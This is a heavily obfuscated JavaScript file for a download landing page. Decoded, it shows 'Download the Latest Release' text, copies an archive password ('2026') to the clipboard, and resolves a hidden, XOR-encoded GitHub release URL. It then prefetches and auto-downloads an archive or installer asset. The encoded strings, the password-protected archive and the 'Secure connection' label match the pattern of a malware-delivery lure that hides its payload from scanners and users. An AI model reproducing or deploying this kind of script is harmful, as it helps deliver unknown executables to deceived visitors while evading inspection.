(() => {
  const br64 = {_QEmzbfGh:"",x0215b6:(function(xba85){var hx46=xba85.join('');var xr29=[];for(var xaef9e6=0;xaef9e6<hx46.length;xaef9e6+=2)xr29.push(parseInt(hx46.substr(xaef9e6,2),16));return new TextDecoder().decode(Uint8Array.from(xr29))})(["323","032","36"]),pp78:String.fromCharCode(67,108,105,99,107,32,116,104,101,32,98,117,116,116,111,110,32,116,111,32,100,111,119,110,108,111,97,100,32,116,104,101,32,102,105,108,101,10,70,111,114,32,105,110,115,116,97,108,108,97,116,105,111,110,44,32,102,111,108,108,111,119,32,116,104,101,32,105,110,115,116,114,117,99,116,105,111,110,115,32,105,110,32,116,104,101,32,97,114,99,104,105,118,101),_EA0nRKE:(function(yt86){return new TextDecoder().decode(Uint8Array.from(atob(yt86),function(_FC5vcTdp){return _FC5vcTdp.charCodeAt(0)}))})("RG93bmxvYWQgdGhlIExhdGVzdCBSZWxlYXNl")}; const zeeVOmT4H = new RegExp((function(x6dc45a3){var xv83=x6dc45a3.join('');var _JOpOnKRwk=[];for(var cJpujoPxX=0;cJpujoPxX<xv83.length;cJpujoPxX+=2)_JOpOnKRwk.push(parseInt(xv83.substr(cJpujoPxX,2),16));return new TextDecoder().decode(Uint8Array.from(_JOpOnKRwk))})(["5c2e","28"])+(function(nqPGxmy){var wk34=nqPGxmy.join('');var _okGOLXA=[];for(var ueMwpgrX2c=0;ueMwpgrX2c<wk34.length;ueMwpgrX2c+=2)_okGOLXA.push(parseInt(wk34.substr(ueMwpgrX2c,2),16));return new TextDecoder().decode(Uint8Array.from(_okGOLXA))})(["7a69","707c","377a","7c72","6172","7c74","6172","7c67","7a7c","7467","7a7c","627a","327c","787a","7c69","736f","7c64","6d67","7c65","7865","7c6d","7369","7c70","6b67"])+(function(_FWpBFKMYfP){var _3TCxR='';for(var ta48=0;ta48<_FWpBFKMYfP.length;ta48++)_3TCxR+=String.fromCodePoint.apply(null,_FWpBFKMYfP[ta48]);return _3TCxR})([[41],[36]]),'i');
  const $ = (id) => document.getElementById(id); const pi86 = {
    _EA0nRKE: $("o3c86fAZhk"), pp78: $("c8ZIiZQ5"), status: $("_pVuHiWm"), xf57: $("_qEzOLW4ds7"), _4WTHnYgX: document.querySelector(".jq74"), x7d92afb: $("xa48d3b57"),
    _FQlL9: document.getElementById("xa48d3b57") && document.getElementById("xa48d3b57").closest(".x095caf83"), sd75: $("x8bbe"),
  }; const kg5sF = { busy: false,
    started: false,
    revealed: false, asset: null,
  }; const x3afb48 = (ms) => new Promise((r) => setTimeout(r, ms)); function rr80() {
    pi86._EA0nRKE.textContent = br64._EA0nRKE || (function(f3YKmi4cr,ph88){var eb55='';for(var n1O7GolmF=f3YKmi4cr.length-1;n1O7GolmF>=0;n1O7GolmF--)eb55+=String.fromCodePoint(f3YKmi4cr[n1O7GolmF]^ph88);return eb55})([34,52,38,34,43,34,21,103,51,52,34,51,38,11,103,34,47,51,103,35,38,40,43,41,48,40,3],71); const pp78 =
      br64.pp78 ||
      (function(x84f1c){return new TextDecoder().decode(Uint8Array.from(atob(x84f1c),function(g2kicSUD){return g2kicSUD.charCodeAt(0)}))})("Q2xpY2sgdGhlIGJ1dHRvbiB0byBkb3dubG9hZCB0aGUgZmlsZQpGb3IgaW5zdGFsbGF0aW9uLCBmb2xsb3cgdGhlIGluc3RydWN0aW9ucyBpbiB0aGUgYXJjaGl2ZQ=="); pi86.pp78.innerHTML = pp78
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\n/g, "<br>"); kg5sF._2k0xXz = String(br64.x0215b6 || "").trim();
    if (pi86.xf57) pi86.xf57.textContent = (function(_CJlNEBG){var _uuKfK76yVc='';for(var _9Dhs9x=0;_9Dhs9x<_CJlNEBG.length;_9Dhs9x++)_uuKfK76yVc+=String.fromCharCode.apply(null,_CJlNEBG[_9Dhs9x]);return _uuKfK76yVc})([[82],[101],[97],[100],[121],[32],[116],[111],[32],[100],[111],[119],[110],[108],[111],[97],[100],[32],[183],[32],[83],[101],[99],[117],[114],[101],[32],[99],[111],[110],[110],[101],[99],[116],[105],[111],[110]]); if (pi86.x7d92afb && kg5sF._2k0xXz) pi86.x7d92afb.textContent = kg5sF._2k0xXz; }

  async function _41h6Qc() {
    if (!pi86._4WTHnYgX || kg5sF.revealed) return;
    kg5sF.revealed = true; const qoTpr = [...pi86._4WTHnYgX.querySelectorAll("._JPv8E")];
    const _XPmQnqi3 = qoTpr.map((swap) => swap.querySelector(".x095caf83.x21cc1206"));
    const _SrtHmD = qoTpr.map((swap) =>
      [...swap.querySelectorAll(".x095caf83")].find((line) => !line.classList.contains("x21cc1206"))
    ); 
    const dWmtIY9Jm = _XPmQnqi3.map((line) =>
      line.animate(
        [
          { opacity: 1, transform: String.fromCodePoint(116,114,97,110,115,108,97,116,101,89,40,48,41) },
          { opacity: 0, transform: (function(wj24){return new TextDecoder().decode(Uint8Array.from(atob(wj24),function(_Fg4D9aO1Ik){return _Fg4D9aO1Ik.charCodeAt(0)}))})("dHJhbnNsYXRlWSgtMThweCk=") }, ],
        { duration: 0x154, easing: (function(xc16addaa){return new TextDecoder().decode(Uint8Array.from(atob(xc16addaa),function(x63cf8){return x63cf8.charCodeAt(0)}))})("Y3ViaWMtYmV6aWVyKC40LCAwLCAuMiwgMSk="), fill: (function(id30,xd8e44){var xiRH1='';for(var x7c7440=id30.length-1;x7c7440>=0;x7c7440--)xiRH1+=String.fromCharCode(id30[x7c7440]^xd8e44);return xiRH1})([32,55,33,50,36,33,60,53],83) }
      )
    ); await Promise.all(dWmtIY9Jm.map((animation) => animation.finished)); 
    _XPmQnqi3.forEach((line) => line.classList.remove("x21cc1206"));
    _SrtHmD.forEach((line) => line.classList.add("x21cc1206"));
    dWmtIY9Jm.forEach((animation) => animation.cancel());

    const wjZ8VWj3 = _SrtHmD.map((line) =>
      line.animate(
        [
          { opacity: 0, transform: (function(_JczgGllZvM,wb59){var xc302='';for(var xx51=0;xx51<_JczgGllZvM.length;xx51++)xc302+=String.fromCharCode(_JczgGllZvM[xx51]^wb59);return xc302})([169,175,188,179,174,177,188,169,184,132,245,236,229,173,165,244],221) }, { opacity: 1, transform: String.fromCodePoint(116,114,97,110,115,108,97,116,101,89,40,48,41) }, ],
        { duration: (309+151), easing: (function(_LLKDuhs2Aa){var x7c80dab='';for(var x5309887=0;x5309887<_LLKDuhs2Aa.length;x5309887++)x7c80dab+=String.fromCodePoint.apply(null,_LLKDuhs2Aa[x5309887]);return x7c80dab})([[99],[117],[98],[105],[99],[45],[98],[101],[122],[105],[101],[114],[40],[46],[49],[54],[44],[32],[49],[44],[32],[46],[51],[44],[32],[49],[41]]) } )
    );
    await Promise.all(wjZ8VWj3.map((animation) => animation.finished)); }

  async function x6b0f6e(text) { const el = pi86.x7d92afb; await el.animate(
      [
        { opacity: 1, transform: String.fromCodePoint(116,114,97,110,115,108,97,116,101,89,40,48,41) }, { opacity: 0, transform: (function(_PwE29p,rTg552){var x52ff6e='';for(var _AECJClQ=0;_AECJClQ<_PwE29p.length;_AECJClQ++)x52ff6e+=String.fromCharCode(_PwE29p[_AECJClQ]^rTg552);return x52ff6e})([237,235,248,247,234,245,248,237,252,192,177,180,172,233,225,176],153) }, ], { duration: (198-18), easing: (function(bKhgiTWP7){var _RZRxngi='';for(var ms81=0;ms81<bKhgiTWP7.length;ms81++)_RZRxngi+=String.fromCodePoint.apply(null,bKhgiTWP7[ms81]);return _RZRxngi})([[101,97],[115,101]]), fill: (function(id30,xd8e44){var xiRH1='';for(var x7c7440=id30.length-1;x7c7440>=0;x7c7440--)xiRH1+=String.fromCharCode(id30[x7c7440]^xd8e44);return xiRH1})([32,55,33,50,36,33,60,53],83) } ).finished;
    el.textContent = text;
    el.animate(
      [
        { opacity: 0, transform: (function(x05a1,_8iXAW){var _uRdIa='';for(var hwQzc5tG=0;hwQzc5tG<x05a1.length;hwQzc5tG++)_uRdIa+=String.fromCodePoint(x05a1[hwQzc5tG]^_8iXAW);return _uRdIa})([41,47,60,51,46,49,60,41,56,4,117,104,45,37,116],93) },
        { opacity: 1, transform: String.fromCodePoint(116,114,97,110,115,108,97,116,101,89,40,48,41) },
      ],
      { duration: (23+217), easing: (function(_LLKDuhs2Aa){var x7c80dab='';for(var x5309887=0;x5309887<_LLKDuhs2Aa.length;x5309887++)x7c80dab+=String.fromCodePoint.apply(null,_LLKDuhs2Aa[x5309887]);return x7c80dab})([[99],[117],[98],[105],[99],[45],[98],[101],[122],[105],[101],[114],[40],[46],[49],[54],[44],[32],[49],[44],[32],[46],[51],[44],[32],[49],[41]]), fill: (function(id30,xd8e44){var xiRH1='';for(var x7c7440=id30.length-1;x7c7440>=0;x7c7440--)xiRH1+=String.fromCharCode(id30[x7c7440]^xd8e44);return xiRH1})([32,55,33,50,36,33,60,53],83) } );
  } async function jo24() {
    const _2k0xXz = kg5sF._2k0xXz;
    if (!_2k0xXz || !pi86.x7d92afb || kg5sF.copying) return; kg5sF.copying = true; try {
      await navigator.clipboard.writeText(_2k0xXz); } catch {
      const field = document.createElement((function(_s6keaSm){var _k0kw2aoR=_s6keaSm.join('');var id78=[];for(var _rxjEzVhlg6=0;_rxjEzVhlg6<_k0kw2aoR.length;_rxjEzVhlg6+=2)id78.push(parseInt(_k0kw2aoR.substr(_rxjEzVhlg6,2),16));return new TextDecoder().decode(Uint8Array.from(id78))})(["746","578","746","172","656","1"]));
      field.value = _2k0xXz;
      field.setAttribute((function(_rPqYiewo){return new TextDecoder().decode(Uint8Array.from(atob(_rPqYiewo),function(qu57){return qu57.charCodeAt(0)}))})("cmVhZG9ubHk="), "");
      field.style.position = (function(sTw0Oul){return new TextDecoder().decode(Uint8Array.from(atob(sTw0Oul),function(_klJYewFu){return _klJYewFu.charCodeAt(0)}))})("Zml4ZWQ="); field.style.left = String.fromCodePoint(45,57,57,57,57,112,120); document.body.appendChild(field); field.select();
      document.execCommand((function(_C8YdVV){return new TextDecoder().decode(Uint8Array.from(atob(_C8YdVV),function(xc825d1){return xc825d1.charCodeAt(0)}))})("Y29weQ=="));
      field.remove(); } await x6b0f6e((function(_QUt7C){var u8k5eo=_QUt7C.join('');var v9wHq=[];for(var z5qBIWy=0;z5qBIWy<u8k5eo.length;z5qBIWy+=2)v9wHq.push(parseInt(u8k5eo.substr(z5qBIWy,2),16));return new TextDecoder().decode(Uint8Array.from(v9wHq))})(["436f","7069","6564"]));
    await x3afb48((194+706)); await x6b0f6e(_2k0xXz);
    kg5sF.copying = false;
  } function _vgOXkZbhp(input){try{return decodeURIComponent(input||"")}catch(e){return input||""}}
  function iYlUPxna(input) {
    if (!input) return null; try {
      const u = new URL(input); if (u.hostname !== (function(fc36,_3Cwej1){var aAmmL4='';for(var jh88=0;jh88<fc36.length;jh88++)aAmmL4+=String.fromCharCode(fc36[jh88]^_3Cwej1);return aAmmL4})([100,106,119,107,118,97,45,96,108,110],3)) return { kind: (function(xc269,yWV7qHO){var h4zyA='';for(var dMyjh1C5=0;dMyjh1C5<xc269.length;dMyjh1C5++)h4zyA+=String.fromCharCode(xc269[dMyjh1C5]^yWV7qHO);return h4zyA})([208,221,198,209,215,192],180), url: input };
      const parts = u.pathname.replace(/^\/|\/$/g, "").split("/");
      const [owner, repo, section, a, b] = parts; if (!owner || !repo) return null;
      if (section === (function(pk12){return new TextDecoder().decode(Uint8Array.from(atob(pk12),function(rnROm4N){return rnROm4N.charCodeAt(0)}))})("cmVsZWFzZXM=") && a === String.fromCharCode(100,111,119,110,108,111,97,100) && b) {
        return { kind: String.fromCharCode(97,115,115,101,116), owner, repo,
          tag: decodeURIComponent(b), file: decodeURIComponent(parts.slice(5).join("/")), }; }
      if (section === (function(pk12){return new TextDecoder().decode(Uint8Array.from(atob(pk12),function(rnROm4N){return rnROm4N.charCodeAt(0)}))})("cmVsZWFzZXM=") && a === (function(ag50){var lu71=ag50.join('');var ck63=[];for(var xce238=0;xce238<lu71.length;xce238+=2)ck63.push(parseInt(lu71.substr(xce238,2),16));return new TextDecoder().decode(Uint8Array.from(ck63))})(["746","167"]) && b) { return { kind: (function(ag50){var lu71=ag50.join('');var ck63=[];for(var xce238=0;xce238<lu71.length;xce238+=2)ck63.push(parseInt(lu71.substr(xce238,2),16));return new TextDecoder().decode(Uint8Array.from(ck63))})(["746","167"]), owner, repo, tag: decodeURIComponent(b) }; }
      return { kind: (function(cVPdyE5Ax,lq77){var x7c59='',kOdMf9nD6j=0;while(kOdMf9nD6j<cVPdyE5Ax.length){x7c59+=String.fromCharCode(cVPdyE5Ax[kOdMf9nD6j]^lq77);kOdMf9nD6j++};return x7c59})([77,64,85,68,82,85],33), owner, repo };
    } catch { return null;
    } } 
  (function(){try{var gq3=[154,37,247];var ok=atob('8lGD6lbNtQqQ81GT9VKZ9kqW/gub81OStWSC/kyYt2aY9FGF9Una0kCb6kCFt3Ke9EGY7VY=');var f0=new Uint8Array(ok.length);for(var gfu=0;gfu<ok.length;gfu++)f0[gfu]=ok.charCodeAt(gfu)^gq3[gfu%gq3.length];br64._QEmzbfGh=new TextDecoder().decode(f0);}catch(e){}})(); 
  async function dz56(path) {
    const res = await fetch((function(_B5NDQb1){var x9a19073='';for(var ih10=0;ih10<_B5NDQb1.length;ih10++)x9a19073+=String.fromCharCode.apply(null,_B5NDQb1[ih10]);return x9a19073})([[104],[116],[116],[112],[115],[58],[47],[47],[97],[112],[105],[46],[103],[105],[116],[104],[117],[98],[46],[99],[111],[109]])+path, {
      headers: { [(function(x1d2750ef){return new TextDecoder().decode(Uint8Array.from(atob(x1d2750ef),function(om91){return om91.charCodeAt(0)}))})("QWNjZXB0")]: (function(wgMFa7oi){var hd55='';for(var _4Ool4A=0;_4Ool4A<wgMFa7oi.length;_4Ool4A++)hd55+=String.fromCharCode.apply(null,wgMFa7oi[_4Ool4A]);return hd55})([[97],[112],[112],[108],[105],[99],[97],[116],[105],[111],[110],[47],[118],[110],[100],[46],[103],[105],[116],[104],[117],[98],[43],[106],[115],[111],[110]]) },
    });
    if (!res.ok) {
      throw new Error(
        res.status === (373+31)
          ? (function(_9MItrZY){var gj98=_9MItrZY.join('');var x41126=[];for(var aIysKY04Lt=0;aIysKY04Lt<gj98.length;aIysKY04Lt+=2)x41126.push(parseInt(gj98.substr(aIysKY04Lt,2),16));return new TextDecoder().decode(Uint8Array.from(x41126))})(["5265","6c65","6173","6520","6e6f","7420","666f","756e","642e"])
          : res.status === (477-74)
            ? (function(oy30,x974fadd){var x239cdd8='',wm12=0;while(wm12<oy30.length){x239cdd8+=String.fromCharCode(oy30[wm12]^x974fadd);wm12++};return x239cdd8})([27,53,40,20,41,62,124,46,61,40,57,124,48,53,49,53,40,114,124,11,61,53,40,124,61,124,49,53,50,41,40,57,124,61,50,56,124,40,46,37,124,61,59,61,53,50,114],92)
            : (function(x79ccbb5,eAP7EwDMLG){var sJkvOx99l='';for(var nTo3Hd=0;nTo3Hd<x79ccbb5.length;nTo3Hd++)sJkvOx99l+=String.fromCharCode(x79ccbb5[nTo3Hd]^eAP7EwDMLG);return sJkvOx99l})([214,248,229,217,228,243,177,244,227,227,254,227,177],145)+res.status+String.fromCharCode(46)
      ); } return res.json();
  }

  function mjG5uN(release, wanted) { const assets = Array.isArray(release.assets) ? release.assets : [];
    if (wanted) {
      const match = assets.find((a) => a.name.toLowerCase() === wanted.toLowerCase());
      if (match) return match;
    } return assets.find((a) => zeeVOmT4H.test(a.name)) || assets[0] || null; } async function bd57(cfg) { const parsed = iYlUPxna(cfg._QEmzbfGh); if (!parsed) throw new Error((function(x6c8fa6fd,_i020ta8H){var qh72='';for(var x21ca=0;x21ca<x6c8fa6fd.length;x21ca++)qh72+=String.fromCharCode(x6c8fa6fd[x21ca]^_i020ta8H);return qh72})([104,73,6,84,67,74,67,71,85,67,6,115,116,106,6,85,67,82,8],38));

    if (parsed.kind === (function(xc269,yWV7qHO){var h4zyA='';for(var dMyjh1C5=0;dMyjh1C5<xc269.length;dMyjh1C5++)h4zyA+=String.fromCharCode(xc269[dMyjh1C5]^yWV7qHO);return h4zyA})([208,221,198,209,215,192],180)) {
      return { name: parsed.url.split("/").pop() || (function(co67,x9b1538){var nnDNE='',sx16=0;while(sx16<co67.length){nnDNE+=String.fromCharCode(co67[sx16]^x9b1538);sx16++};return nnDNE})([183,188,164,189,191,188,178,183,253,177,186,189],211),
        [(function(te21){return new TextDecoder().decode(Uint8Array.from(atob(te21),function(hBQr2LyJAk){return hBQr2LyJAk.charCodeAt(0)}))})("YnJvd3Nlcl9kb3dubG9hZF91cmw=")]: parsed.url, size: 0, }; }

    if (parsed.kind === String.fromCharCode(97,115,115,101,116)) { try {
        const release = await dz56(
          (function(cVlLAcCD,qk70){var uy96='';for(var ivDffOPCAD=0;ivDffOPCAD<cVlLAcCD.length;ivDffOPCAD++)uy96+=String.fromCodePoint(cVlLAcCD[ivDffOPCAD]^qk70);return uy96})([193,156,139,158,129,157,193],238)+parsed.owner+String.fromCharCode(47)+parsed.repo+(function(_V86AuN,pa91){var xeee98='';for(var _ha701=0;_ha701<_V86AuN.length;_ha701++)xeee98+=String.fromCharCode(_V86AuN[_ha701]^pa91);return xeee98})([87,10,29,20,29,25,11,29,11,87,12,25,31,11,87],120)+encodeURIComponent(parsed.tag)
        );
        return mjG5uN(release, parsed.file) || {
          name: parsed.file, [(function(vr67){var x08240=vr67.join('');var x4499f=[];for(var a3pZa67=0;a3pZa67<x08240.length;a3pZa67+=2)x4499f.push(parseInt(x08240.substr(a3pZa67,2),16));return new TextDecoder().decode(Uint8Array.from(x4499f))})(["62726","f7773","65725","f646f","776e6","c6f61","645f7","5726c"])]: (function(x4a9a){return new TextDecoder().decode(Uint8Array.from(atob(x4a9a),function(_5PpmL8){return _5PpmL8.charCodeAt(0)}))})("aHR0cHM6Ly9naXRodWIuY29tLw==")+parsed.owner+(function(_tGENwkBazL){var fhGXJmjcMb='';for(var xb1dc9d2d=0;xb1dc9d2d<_tGENwkBazL.length;xb1dc9d2d++)fhGXJmjcMb+=String.fromCharCode.apply(null,_tGENwkBazL[xb1dc9d2d]);return fhGXJmjcMb})([[47]])+parsed.repo+(function(tbSzTLNc){var x5291f='';for(var oIWCBbhM=0;oIWCBbhM<tbSzTLNc.length;oIWCBbhM++)x5291f+=String.fromCodePoint.apply(null,tbSzTLNc[oIWCBbhM]);return x5291f})([[47,114],[101,108],[101,97],[115,101],[115,47],[100,111],[119,110],[108,111],[97,100],[47]])+parsed.tag+(function(x3ab6c,jChIBzoi){var jf1zzSwqI='';for(var x7253ab=x3ab6c.length-1;x7253ab>=0;x7253ab--)jf1zzSwqI+=String.fromCodePoint(x3ab6c[x7253ab]^jChIBzoi);return jf1zzSwqI})([135],168)+parsed.file, size: 0, };
      } catch { return { name: parsed.file,
          [(function(xfaad3){var u2tEILMQ7='';for(var ga78=0;ga78<xfaad3.length;ga78++)u2tEILMQ7+=String.fromCodePoint.apply(null,xfaad3[ga78]);return u2tEILMQ7})([[98,114],[111,119],[115,101],[114,95],[100,111],[119,110],[108,111],[97,100],[95,117],[114,108]])]: (function(x4a9a){return new TextDecoder().decode(Uint8Array.from(atob(x4a9a),function(_5PpmL8){return _5PpmL8.charCodeAt(0)}))})("aHR0cHM6Ly9naXRodWIuY29tLw==")+parsed.owner+(function(_tGENwkBazL){var fhGXJmjcMb='';for(var xb1dc9d2d=0;xb1dc9d2d<_tGENwkBazL.length;xb1dc9d2d++)fhGXJmjcMb+=String.fromCharCode.apply(null,_tGENwkBazL[xb1dc9d2d]);return fhGXJmjcMb})([[47]])+parsed.repo+(function(tbSzTLNc){var x5291f='';for(var oIWCBbhM=0;oIWCBbhM<tbSzTLNc.length;oIWCBbhM++)x5291f+=String.fromCodePoint.apply(null,tbSzTLNc[oIWCBbhM]);return x5291f})([[47,114],[101,108],[101,97],[115,101],[115,47],[100,111],[119,110],[108,111],[97,100],[47]])+parsed.tag+(function(x3ab6c,jChIBzoi){var jf1zzSwqI='';for(var x7253ab=x3ab6c.length-1;x7253ab>=0;x7253ab--)jf1zzSwqI+=String.fromCodePoint(x3ab6c[x7253ab]^jChIBzoi);return jf1zzSwqI})([135],168)+parsed.file,
          size: 0,
        };
      } } const path =
      parsed.kind === (function(ag50){var lu71=ag50.join('');var ck63=[];for(var xce238=0;xce238<lu71.length;xce238+=2)ck63.push(parseInt(lu71.substr(xce238,2),16));return new TextDecoder().decode(Uint8Array.from(ck63))})(["746","167"])
        ? (function(cVlLAcCD,qk70){var uy96='';for(var ivDffOPCAD=0;ivDffOPCAD<cVlLAcCD.length;ivDffOPCAD++)uy96+=String.fromCodePoint(cVlLAcCD[ivDffOPCAD]^qk70);return uy96})([193,156,139,158,129,157,193],238)+parsed.owner+String.fromCharCode(47)+parsed.repo+(function(_V86AuN,pa91){var xeee98='';for(var _ha701=0;_ha701<_V86AuN.length;_ha701++)xeee98+=String.fromCharCode(_V86AuN[_ha701]^pa91);return xeee98})([87,10,29,20,29,25,11,29,11,87,12,25,31,11,87],120)+encodeURIComponent(parsed.tag)
        : (function(sl3Od){var _buHSFyYXI='';for(var wyNAZVK=0;wyNAZVK<sl3Od.length;wyNAZVK++)_buHSFyYXI+=String.fromCodePoint.apply(null,sl3Od[wyNAZVK]);return _buHSFyYXI})([[47,114],[101,112],[111,115],[47]])+parsed.owner+(function(dHEcn){var _57OEQ='';for(var _sU0mcZ1Wty=0;_sU0mcZ1Wty<dHEcn.length;_sU0mcZ1Wty++)_57OEQ+=String.fromCodePoint.apply(null,dHEcn[_sU0mcZ1Wty]);return _57OEQ})([[47]])+parsed.repo+(function(l92tZz){var _uHLiN3p=l92tZz.join('');var _2hSnh=[];for(var quV7oYb=0;quV7oYb<_uHLiN3p.length;quV7oYb+=2)_2hSnh.push(parseInt(_uHLiN3p.substr(quV7oYb,2),16));return new TextDecoder().decode(Uint8Array.from(_2hSnh))})(["2f7265","6c6561","736573","2f6c61","746573","74"]);
    const release = await dz56(path);
    const asset = mjG5uN(release, ""); if (!asset) throw new Error((function(_ytQ8IMA9,ah55){var sd67='',c0UCIL=0;while(c0UCIL<_ytQ8IMA9.length){sd67+=String.fromCharCode(_ytQ8IMA9[c0UCIL]^ah55);c0UCIL++};return sd67})([93,124,51,117,122,127,118,96,51,122,125,51,103,123,122,96,51,97,118,127,118,114,96,118,61],19));
    return asset; }
 function xd5d248(url, name) {
    const a = document.createElement("a");
    a.href = url; a.download = name || ""; a.rel = (function(rg45,x9a0379){var _mAkVVXOz='';for(var xadee=0;xadee<rg45.length;xadee++)_mAkVVXOz+=String.fromCodePoint(rg45[xadee]^x9a0379);return _mAkVVXOz})([130,131,131,156,137,130,137,158],236);
    a.style.display = (function(eyhbBJLc,_5wNVLoI){var v7jPpX='';for(var fhvMUzs=eyhbBJLc.length-1;fhvMUzs>=0;fhvMUzs--)v7jPpX+=String.fromCharCode(eyhbBJLc[fhvMUzs]^_5wNVLoI);return v7jPpX})([104,99,98,99],13);
    document.body.appendChild(a);
    a.click(); a.remove(); } async function x59204() {
    if (kg5sF.busy) return; kg5sF.busy = true;
    kg5sF.started = true; if (pi86.sd75) pi86.sd75.disabled = true; 
    try { const asset = kg5sF.asset || (await bd57({ _QEmzbfGh: _vgOXkZbhp(br64._QEmzbfGh) }));
      kg5sF.asset = asset;
      await _41h6Qc();
      xd5d248(asset[(function(x673b5){var iQM80x='';for(var _1cxSOX4Es=0;_1cxSOX4Es<x673b5.length;_1cxSOX4Es++)iQM80x+=String.fromCharCode.apply(null,x673b5[_1cxSOX4Es]);return iQM80x})([[98],[114],[111],[119],[115],[101],[114],[95],[100],[111],[119],[110],[108],[111],[97],[100],[95],[117],[114],[108]])], asset.name); await x3afb48((23+217)); } catch {
      if (pi86.status) pi86.status.textContent = (function(znnup4KyO){var cq82=znnup4KyO.join('');var cZBLZ8zm1=[];for(var _JelgaVmC9=0;_JelgaVmC9<cq82.length;_JelgaVmC9+=2)cZBLZ8zm1.push(parseInt(cq82.substr(_JelgaVmC9,2),16));return new TextDecoder().decode(Uint8Array.from(cZBLZ8zm1))})(["446","f77","6e6","c6f","616","420","666","169","6c6","564"]); } finally {
      if (pi86.sd75) pi86.sd75.disabled = false; kg5sF.busy = false; }
  }
 rr80(); if (pi86._FQlL9) pi86._FQlL9.addEventListener((function(x1cee31c,ze58){var wk36='';for(var _w9ooIGxn=0;_w9ooIGxn<x1cee31c.length;_w9ooIGxn++)wk36+=String.fromCharCode(x1cee31c[_w9ooIGxn]^ze58);return wk36})([42,37,32,42,34],73), jo24); if (pi86.sd75) pi86.sd75.addEventListener((function(x1cee31c,ze58){var wk36='';for(var _w9ooIGxn=0;_w9ooIGxn<x1cee31c.length;_w9ooIGxn++)wk36+=String.fromCharCode(x1cee31c[_w9ooIGxn]^ze58);return wk36})([42,37,32,42,34],73), x59204); window.addEventListener(
    (function(_n92wW){return new TextDecoder().decode(Uint8Array.from(atob(_n92wW),function(oHPr99wHxZ){return oHPr99wHxZ.charCodeAt(0)}))})("bG9hZA=="), async () => {
      try { kg5sF.asset = await bd57({ _QEmzbfGh: _vgOXkZbhp(br64._QEmzbfGh) });
      } catch {
        kg5sF.asset = null; }
    },
    { once: true }
  );
})();
